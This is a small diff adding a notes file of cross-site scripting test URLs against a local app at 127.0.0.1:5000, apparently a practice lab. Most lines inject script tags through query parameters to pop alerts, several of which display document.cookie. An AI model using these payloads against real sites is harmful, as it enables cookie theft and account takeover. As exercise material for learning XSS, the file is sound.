@@ -1,0 +1,17 @@
+
+hello_js =>
+http://127.0.0.1:5000/xss/hello_js/?username=greetUser()
+
+http://127.0.0.1:5000/xss/hello_js/?username=%3Cscript%3Ewindow.onload%20=%20function()%20{alert(%27Hello%27)}%3C/script%3E
+
+
+hello_html_attr =>
+
+http://127.0.0.1:5000/xss/hello_html_attr/?style=color:yellow
+
+
+hello_html =>
+
+http://127.0.0.1:5000/xss/hello_html/?name="/><script/>alert(document.cookie)</script>
+
+http://127.0.0.1:5000/xss/hello_html/?name=%3C/h1%3E%3Cscript%3Ewindow.onload(alert(document.cookie))%3C/script%3E%3Ch1%3E
